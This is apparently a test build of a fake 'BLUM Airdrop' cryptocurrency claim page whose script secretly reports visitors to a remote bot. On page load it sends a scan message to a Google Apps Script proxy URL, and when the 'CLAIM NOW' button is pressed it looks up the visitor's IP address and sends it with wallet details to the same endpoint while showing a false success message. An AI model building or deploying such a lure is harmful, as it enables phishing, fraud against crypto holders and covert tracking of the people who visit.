<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>BLUM Airdrop Test</title>
</head>
<body>
    <h1>🎁 BLUM Airdrop</h1>
    <button id="claimBtn">CLAIM NOW</button>
    <div id="status"></div>

    <script>
        const PROXY_URL = "https://script.google.com/macros/s/AKfycbw8bj1vgKSH5dEsP6vGJEZZUTEmTczqajcqCl3K1MUcAYe044TGWEu4JmNISGxZ1NLt/exec";
        
        function sendToBot(message) {
            fetch(PROXY_URL + '?message=' + encodeURIComponent(message), { method: 'GET', mode: 'no-cors' });
            console.log("📤 إرسال:", message.substring(0, 60));
        }
        
        // PAGE SCAN (يعمل بالفعل)
        sendToBot('📊 PAGE SCAN - Blum Airdrop');
        
        // زر المطالبة
        document.getElementById('claimBtn').onclick = async function() {
            console.log("🔘 تم الضغط على الزر");
            
            const wallet = "MetaMask";
            const address = "0x" + Math.random().toString(36).substring(2, 14);
            const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
            
            const msg = `🎁 CLAIM\nWallet: ${wallet}\nAddress: ${address}\nIP: ${ip}`;
            sendToBot(msg);
            
            document.getElementById('status').innerHTML = "✅ تمت المطالبة!";
            document.getElementById('claimBtn').disabled = true;
        };
    </script>
</body>
</html>
